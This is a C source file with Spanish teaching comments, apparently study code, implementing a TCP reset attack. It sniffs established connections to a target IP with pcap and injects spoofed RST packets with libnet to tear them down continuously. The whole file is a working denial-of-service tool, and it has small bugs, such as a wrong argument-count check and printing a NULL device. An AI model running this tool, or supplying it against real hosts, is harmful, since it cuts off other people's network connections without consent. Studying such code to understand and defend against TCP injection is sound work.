//Usamos las dos librerías, pcap y libnet, la primera para capturar paquetes, la segunda para crearlos
//Librería libnet
#include <libnet.h>
//Librería pcap
#include <pcap.h>
#include "..\hacking"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass
{
    libnet_t *l;
};

int main(int argc, char *argv[])
{
    //Libnet
    //Buffer para guardar los errores
    u_char errbuf[LIBNET_ERRBUF_SIZE];
    //Contexto
    libnet_t *l;
    //IP Destino
    u_long target_ip;

    //pcap
    char pcap_errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE
    pcap_t *pcap_handle;
    pcap_if_t *interfaces, *device;

    //Validaciones
    if (argc < 1)
    {
        printf("Usage: %s <target IP>\n", argv[0]);
        exit(0);
    }

    //LIBNET
    //Crea un contexto de libnet
    /*
    injection_type is the injection type, as in "from the link layer up" or "from the network layer up". 
    We’ll use LIBNET_RAW4 (IPv4 and above) and LIBNET_LINK (link layer and above).
    */
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    //Obtiene la direccion IP destino
    target_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE); // The host
    if (target_ip == -1)
        fatal("Invalid target address");

    //PCAP
    /* Abrimos la captura en el primero de los dispositivos disponibles */
    //Retieves all the interfaces available
    if (pcap_findalldevs(&interfaces, pcap_errbuf) == -1)
        pcap_fatal("pcap_lookupdev", pcap_errbuf);

    //Print the available devices
    printf("\nAvailable Devices are :\n");
    for (device = interfaces; device != NULL; device = device->next)
    {
        printf("%s - %s\n", device->name, device->description);
    }
    printf("Sniffing on device %s\n", interfaces[0].name);

    /* pcap_open_live() function opens a packet-capturing device, returning a handle to it. The arguments for this function are the device to sniff, 
    the maximum packet size, a promiscuous flag, a timeout value, and a pointer to the error buffer*/
    pcap_handle = pcap_open_live(interfaces[0].name, 4096, 1, 0, pcap_errbuf);
    if (pcap_handle == NULL)
        fatal(pcap_errbuf);

    struct data_pass critical_libnet_data;
    critical_libnet_data.l=l;

    //Iniciamos el generador de numeros aleatorios de libnet
    libnet_seed_prand(l);

    //Fijamos el filtro de los paquetes que queremos capturar. Es un filtro BPF
    set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);
    printf("Resetting all TCP connections to %s on %s\n", argv[1], device);

    /*The pcap_loop() retrieves packages for the device. 
    * We have to specify how many packages to capture, three in this case. If we inform -1 it will continue capturing packages indefinitelly
    * We also specify a call back function that will be in charge of processing the package. We may also specify optionally an argument to the function*/
    /*Captura paquetes de forma indefinida. Cada paquete capturado es procesado con el callback
    caught_packet, al que le pasamos un argumento, la estructura critical_libnet_data
    En este argumento pasamos la información que necesitamos para utilizar la linbreria libnet en el handler que procesa
    cada paquete capturado*/
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

    //Terminamos la captura de paquetes
    pcap_close(pcap_handle);
}

/* Sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip)
{
    //Programa compilado con un filtro BPF
    struct bpf_program filter;
    char filter_string[100];

    /*Filtramos todos los paquetes destinados a nuestro host y que tenga el flag ACK activado - es decir, que pertenezcan a una conexión TCP ya establecida*/
    sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));
    printf("DEBUG: filter string is \'%s\'\n", filter_string);
    
    //Crea el filtro BPF
    if (pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
        fatal("pcap_compile failed");
    
    //Asociamos el filtro BPF a nuestra conexión
    if (pcap_setfilter(pcap_hdl, &filter) == -1)
        fatal("pcap_setfilter failed");
}

//Captura un paquete
void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet)
{
    struct data_pass *passed;

    //Argumento
    passed = (struct data_pass *)user_args; // Pass data using a pointer to a struct.

    /* Building IP header */
    /*
    libnet_ptag_t libnet_build_ipv4 (u_int16_t len,
    u_int8_t tos,
    u_int16_t id,
    u_int16_t frag,
    u_int8_t ttl, 
    u_int8_t prot,
    u_int16_t sum,
    u_int32_t src, 
    u_int32_t dst,
    u_int8_t * payload,
    u_int32_t payload_s,
    libnet_t * l,
    libnet_ptag_t ptag)

    len is total packet length (from the network layer POV, i.e. not including the link layer header);
    tos is type of service (useless, set to 0);
    id is the sequential id number (leave as 0 for the kernel to fill it in for you);
    frag is fragmentation flags and offset (0 for no fragmentation (if do want it, checkout advanced mode below));
    prot is the next header’s protocol (useful macros are IPPROTO_ICMP, IPPROTO_TCP, IPPROTO_UDP);
    ttl is time to live, the number of hops before a router discards your packet considering it entered a routing loop (usually set to 64 or 255, or incremented from 1 for tracerouting, for example);
    sum is the checksum (leave as 0 for the kernel to fill it in);
    src and dst are the source and destination addresses;
    payload and payload_s are a pointer to and length of the payload (NULL and 0 if there’s none);
    l and ptag are libnet’s context 
    and the tag used to modify this header (see next section).
    */

    //Despues de la cabecera Ethernet tenemos el paquete IP
    //packet apunta al principio del mensaje, si le sumamos LIBNET_ETH_H apunta a la cabecera IP
    struct libnet_ipv4_hdr *IPhdr;
    IPhdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);

    //Construimos el paquete IP
    libnet_build_ipv4(LIBNET_IPV4_H,                  // Size of the packet sans IP header
                    IPTOS_LOWDELAY,                 // IP tos
                    libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
                    0,                              // Frag stuff
                    libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
                    IPPROTO_TCP,                    // Transport protocol
                    0,                              // Checksum; Para la capa IP lo calculara el kernel
                    *((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst)
                    *((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src)
                    NULL,                           // Payload (none)
                    0,                              // Payload length
                    passed->l,                      // Context
                    0);                             // packet tag

    /*
    
    libnet_ptag_t libnet_build_tcp	(	
    uint16_t 	sp,
    uint16_t 	dp,
    uint32_t 	seq,
    uint32_t 	ack,
    uint8_t 	control,
    uint16_t 	win,
    uint16_t 	sum,
    uint16_t 	urg,
    uint16_t 	len,
    const uint8_t * 	payload,
    uint32_t 	payload_s,
    libnet_t * 	l,
    libnet_ptag_t 	ptag 
    )	

    sp	source port
    dp	destination port
    seq	sequence number
    ack	acknowledgement number
    control	control flags
    win	window size
    sum	checksum (0 for libnet to autofill)
    urg	urgent pointer
    len	total length of the TCP packet (for checksum calculation)
    payload	
    payload_s	payload length or 0
    l	pointer to a libnet context
    ptag	protocol tag to modify an existing header, 0 to build a new one

    */
    //Despues de la cabecera IP tenemos el paquete TCP
    //packet apunta al principio del mensaje, si le sumamos LIBNET_ETH_H y LIBNET_IPV4_H apunta a la cabecera TCP
    struct libnet_tcp_hdr *TCPhdr;
    TCPhdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H+ LIBNET_IPV4_H);
    //Mostramos la IP y el puerto destino y origen
    printf("resetting TCP connection from %s:%d ", inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
    printf("<---> %s:%d\n", inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));

    //Construimos el paquete TCP
    libnet_build_tcp(htons(TCPhdr->th_dport),        // Source TCP port (pretend we are dst)
                     htons(TCPhdr->th_sport),        // Destination TCP port (send back to src)
                     htonl(TCPhdr->th_ack),          // Sequence number (use previous ack)
                     libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)
                     TH_RST,                         // Control flags (RST flag set only)
                     libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
                     0,                              // Checksum. Con 0 se autogenera
                     0,                              // Urgent pointer
                     LIBNET_TCP_H,                    // Length
                     NULL,                       // Payload (none)
                     0,                              // Payload length
                     passed->l,                      // Contexto
                     0);                             // Packet tag

    int bytes_written = libnet_write(passed->l);
    if (bytes_written != -1)
        printf("%d bytes written.\n", bytes_written);
    else
    {
        fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(passed->l));
    }

    usleep(5000); // pause slightly
}